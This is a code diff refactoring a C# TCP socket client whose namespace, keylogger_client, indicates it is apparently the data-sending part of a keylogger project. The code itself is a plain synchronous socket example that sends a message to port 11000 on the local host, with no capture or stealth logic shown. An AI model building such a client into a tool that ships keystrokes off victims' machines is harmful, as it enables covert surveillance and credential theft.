@@ -7,48 +7,31 @@ namespace keylogger_client
 {
     public class SynchronousClient
     {
-
-        public static void Send(string data)
+        /// <summary>
+        /// Connect
+        /// Send msg synchronously
+        /// and disconnect
+        /// </summary>
+        /// <param name="msg"></param>
+        public static void Send(string msg)
         {
-            // Data buffer for incoming data.  
-            byte[] bytes = new byte[1024];
-
-            // Connect to a remote device.  
             try
             {
-                // Establish the remote endpoint for the socket.  
-                // This example uses port 11000 on the local computer.  
-                IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());
-                IPAddress ipAddress = ipHostInfo.AddressList[0];
-                IPEndPoint remoteEP = new IPEndPoint(ipAddress, 11000);
-
-                // Create a TCP/IP  socket.  
-                Socket sender = new Socket(ipAddress.AddressFamily,
-                    SocketType.Stream, ProtocolType.Tcp);
-
-                // Connect the socket to the remote endpoint. Catch any errors.  
+                var ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());
+                var ipAddress = ipHostInfo.AddressList[0];
                 try
                 {
+                    var remoteEP = new IPEndPoint(ipAddress, 11000);
+                    var sender = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                     sender.Connect(remoteEP);
-
-                    Console.WriteLine("Socket connected to {0}",
-                        sender.RemoteEndPoint.ToString());
-
-                    // Encode the data string into a byte array.  
-                    byte[] msg = Encoding.ASCII.GetBytes($"{data}<EOF>");
-
-                    // Send the data through the socket.  
-                    int bytesSent = sender.Send(msg);
-
-                    // Receive the response from the remote device.  
-                    int bytesRec = sender.Receive(bytes);
-                    Console.WriteLine("Echoed test = {0}",
-                        Encoding.ASCII.GetString(bytes, 0, bytesRec));
-
-                    // Release the socket.  
+                    Console.WriteLine("Socket connected to {0}", sender.RemoteEndPoint.ToString());
+                    var data = Encoding.ASCII.GetBytes($"{msg}<EOF>");
+                    var bytesSent = sender.Send(data);
+                    var bytes = new byte[1024];
+                    var bytesRec = sender.Receive(bytes);
+                    Console.WriteLine("Echoed test = {0}", Encoding.ASCII.GetString(bytes, 0, bytesRec));
                     sender.Shutdown(SocketShutdown.Both);
                     sender.Close();
-
                 }
                 catch (ArgumentNullException ane)
                 {
@@ -62,7 +45,6 @@ namespace keylogger_client
                 {
                     Console.WriteLine("Unexpected exception : {0}", e.ToString());
                 }
-
             }
             catch (Exception e)
             {
